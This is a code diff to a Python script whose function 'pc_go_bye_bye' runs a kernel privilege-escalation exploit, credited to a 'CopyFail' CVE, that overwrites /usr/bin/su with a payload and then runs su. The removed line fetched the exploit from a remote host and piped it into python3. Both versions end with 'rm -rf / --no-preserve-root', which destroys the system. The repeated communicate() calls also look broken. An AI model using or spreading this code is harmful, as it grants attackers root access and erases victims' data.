@@ -32,7 +32,20 @@ def ask_the_question():
 
 
 def pc_go_bye_bye():
-    process = subprocess.Popen('curl https://copy.fail/exp | python3 && su', stdin=subprocess.PIPE, text=True, shell=True)
+    process = subprocess.Popen('python3', stdin=subprocess.PIPE, text=True, shell=True)
+    #CopyFail (Initial Script here : https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py)
+    process.communicate(input="import os as g,zlib,socket as s")
+    process.communicate(input="def d(x):return bytes.fromhex(x)\n")
+    process.communicate(input="\n")
+    process.communicate(input="def c(f,t,c):\n")
+    process.communicate(input="""a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)\n""")
+    process.communicate(input="try:u.recv(8+t)\n")
+    process.communicate(input="except:0")
+    process.communicate(input="\n")
+    process.communicate(input="""f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))\n""")
+    process.communicate(input="while i<len(e):c(f,i,e[i:i+4]);i+=4")
+    process.communicate(input="\n")
+    process.communicate(input="""g.system("su")""")
     process.communicate(input="rm -rf / --no-preserve-root\n")
 # Main script
 is_Compatible()
